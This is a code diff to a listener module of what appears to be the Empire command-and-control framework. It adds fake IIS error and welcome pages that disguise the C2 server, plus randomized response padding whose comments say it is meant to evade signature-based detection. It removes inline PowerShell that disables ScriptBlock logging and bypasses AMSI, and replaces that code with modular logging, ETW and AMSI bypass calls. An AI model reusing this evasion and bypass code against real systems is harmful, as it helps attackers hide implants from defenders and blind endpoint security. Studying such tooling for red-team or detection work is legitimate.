@@ -141,6 +141,9 @@ class Listener(object):
         # optional/specific for this module
         self.app = None
 
+        # randomize the length of the default_response and index_page headers to evade signature based scans
+        self.header_offset = random.randint(0, 64)
+
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
@@ -158,11 +161,118 @@ class Listener(object):
 
     def default_response(self):
         """
-        If there's a default response expected from the server that the client needs to ignore,
-        (i.e. a default HTTP page), put the generation here.
+        Returns an IIS 7.5 404 not found page.
         """
-        print(helpers.color("[!] default_response() not implemented for listeners/template"))
-        return ''
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>404 - File or directory not found.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>404 - File or directory not found.</h2>',
+            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>',
+            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
+        ])
+
+    def method_not_allowed_page(self):
+        """
+        Imitates IIS 7.5 405 "method not allowed" page.
+        """
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>405 - HTTP verb used to access this page is not allowed.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>405 - HTTP verb used to access this page is not allowed.</h2>',
+            '  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>\r\n'
+        ])
+
+    def index_page(self):
+        """
+        Returns a default HTTP server page.
+        """
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
+            '<title>IIS7</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body {',
+            '	color:#000000;',
+            '	background-color:#B3B3B3;',
+            '	margin:0;',
+            '}',
+            '',
+            '#container {',
+            '	margin-left:auto;',
+            '	margin-right:auto;',
+            '	text-align:center;',
+            '	}',
+            '',
+            'a img {',
+            '    border:none;',
+            '}',
+            '',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="container">',
+            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
+            '</div>',
+            '</body>',
+            '</html>',
+        ])
 
 
     def validate_options(self):
@@ -279,39 +389,22 @@ class Listener(object):
                 vWc = helpers.generate_random_script_var_name("wc")
                 vData = helpers.generate_random_script_var_name("data")
 
-                # ==== SAFE CHECKS ====
                 launcherBase = '$ErrorActionPreference = \"SilentlyContinue\";'
+
                 if safeChecks.lower() == 'true':
                     launcherBase = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
-                    # ScriptBlock Loggin bypass
-                    launcherBase += helpers.randomize_capitalization("$"+vGPF+"=[ref].Assembly.GetType(")
-                    launcherBase += "'System.Management.Automation.Utils'"
-                    launcherBase += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    launcherBase += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    launcherBase += helpers.randomize_capitalization(");If($"+vGPF+"){$"+vGPC+"=$"+vGPF+".GetValue($null);If($"+vGPC+"")
-                    launcherBase += "['ScriptB'+'lockLogging']"
-                    launcherBase += helpers.randomize_capitalization("){$"+vGPC+"")
-                    launcherBase += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    launcherBase += helpers.randomize_capitalization("$"+vGPC+"")
-                    launcherBase += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    launcherBase += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    launcherBase += "('EnableScriptB'+'lockLogging',0);"
-                    launcherBase += helpers.randomize_capitalization("$val.Add")
-                    launcherBase += "('EnableScriptBlockInvocationLogging',0);"
-                    launcherBase += helpers.randomize_capitalization("$"+vGPC+"")
-                    launcherBase += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    launcherBase += helpers.randomize_capitalization("=$val}")
-                    launcherBase += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    launcherBase += "'signatures','N'+'onPublic,Static'"
-                    launcherBase += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
-                    # @mattifestation's AMSI bypass
-                    launcherBase += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    launcherBase += "'System.Management.Automation.AmsiUtils'"
-                    launcherBase += helpers.randomize_capitalization(');$Ref.GetField(')
-                    launcherBase += "'amsiInitFailed','NonPublic,Static'"
-                    launcherBase += helpers.randomize_capitalization(").SetValue($null,$true);")
+                    # ScriptBlock Logging bypass
+                if scriptLogBypass:
+                    launcherBase += bypasses.scriptBlockLogBypass()
+                if ETWBypass:
+                    launcherBase += bypasses.ETWBypass()
+                # @mattifestation's AMSI bypass
+                if AMSIBypass:
+                    launcherBase += bypasses.AMSIBypass()
+                # rastamouse AMSI bypass
+                if AMSIBypass2:
+                    launcherBase += bypasses.AMSIBypass2()
+                if safeChecks.lower() == 'true':
                     launcherBase += "};"
                     launcherBase += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
@@ -906,7 +999,7 @@ class Listener(object):
                 sendMessage += "}"
                 sendMessage += "};"
 
-                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
+                return updateServers + getTask + sendMessage
 
 
             elif language.lower() == 'python':
@@ -1140,7 +1233,7 @@ class Listener(object):
                                         # step 2 of negotiation -> server returns stager (stage 1)
 
                                         # log event
-                                        message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                        message = "\n[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
                                         signal = json.dumps({
                                             'print': True,
                                             'message': message
